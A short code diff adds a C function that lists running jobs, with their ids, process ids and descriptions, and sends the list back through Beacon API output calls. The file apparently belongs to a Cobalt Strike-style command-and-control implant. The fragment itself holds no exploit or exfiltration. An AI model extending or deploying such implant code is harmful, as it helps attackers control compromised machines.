@@ -104,3 +104,19 @@ void JobKill(char* buffer, int size)
 
 	JobCleanup();
 }
+
+void JobPrintAll()
+{
+	formatp format;
+	BeaconFormatAlloc(&format, 0x8000);
+
+	for (JOB_ENTRY* job = gJobs; job; job = job->next)
+	{
+		BeaconFormatPrintf(&format, "%d\t%d\t%s\n", job->id, job->pid32, job->description);
+	}
+
+	int size = BeaconDataLength(&format);
+	char* buffer = BeaconDataOriginal(&format);
+	BeaconOutput(CALLBACK_JOBS, buffer, size);
+	BeaconFormatFree(&format);
+}
